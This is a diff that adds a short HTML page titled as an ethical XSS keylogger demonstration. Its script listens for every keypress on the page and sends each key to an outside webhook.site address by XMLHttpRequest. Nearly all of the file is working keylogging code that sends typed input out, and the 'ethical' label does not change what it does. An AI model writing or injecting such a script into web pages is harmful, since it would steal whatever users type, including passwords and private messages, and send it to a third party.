@@ -1,0 +1,47 @@
+<s>vamp</s>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Keylogger Demonstration</title>
+</head>
+<body>
+    <h1>Keylogger Demonstration (Ethical)</h1>
+    <p>Type something in the text box below:</p>
+    <input type="text" id="inputBox" style="width: 300px;">
+
+    <script>
+        // Define the webhook URL
+        var webhookUrl = 'https://webhook.site/a967c797-0924-463e-9cf6-caeb8377a282';
+
+        // Add an event listener to capture keystrokes
+        document.addEventListener('keypress', function(event) {
+            var key = event.key;
+            console.log('Captured Key:', key); // Debug log
+
+            // Create a new XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', webhookUrl, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+
+            // Prepare the data to be sent
+            var data = JSON.stringify({ key: key });
+            console.log('Data Sent:', data); // Debug log
+
+            // Send the request with the data
+            xhr.send(data);
+
+            // Check for request state changes (optional)
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    console.log('Response Status:', xhr.status); // Debug log
+                    if (xhr.status === 200) {
+                        console.log('Data sent successfully');
+                    } else {
+                        console.error('Error sending data:', xhr.statusText);
+                    }
+                }
+            };
+        });
+    </script>
+</body>
+</html>
